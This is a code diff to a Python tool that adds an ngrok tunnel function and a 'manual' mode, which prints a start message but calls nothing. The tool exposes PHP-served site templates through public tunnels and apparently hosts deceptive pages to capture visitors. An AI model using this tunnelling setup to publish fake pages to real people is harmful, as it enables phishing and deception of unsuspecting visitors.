@@ -91,6 +91,8 @@ def tunnel_select():
 	elif tunnel_mode == 'serveo':
 		print(G + '[+]' + C + ' Started SERVEO...' + W + '\n')
 		serveo()
+	elif tunnel_mode == 'manual':
+		print(G + '[+]' + C + ' Started NGROK...' + W + '\n')
 	else:
 		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
 		exit()
@@ -175,6 +177,15 @@ def serveo():
 				print(e)
 				pass
 		time.sleep(2)
+		
+def ngrokserver():
+	print('\n' + G + '[+]' + C + ' Starting NGROK Server......' + W, end='')
+	http_tunnel = ngrok.connect(8080)
+	print(C + '[' + G + ' Success ' + C + ']' + W)
+	http_tunnel = str(http_tunnel)
+	http_tunnel = http_tunnel.split("-")[0]
+	time.sleep(5)
+	print('\n' + G + '[+]' + C + ' NGROK started: ' + http_tunnel)
 
 def server():
 	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
@@ -183,8 +194,8 @@ def server():
 	print(C + '[' + G + ' Success ' + C + ']' + W)
 	http_tunnel = str(http_tunnel)
 	http_tunnel = http_tunnel.split("-")[0]
+	time.sleep(5)
 	print('\n' + G + '[+]' + C + ' NGROK started: ' + http_tunnel)
-	time.sleep(10)
 	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
 	with open('logs/php.log', 'w') as phplog:
 		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
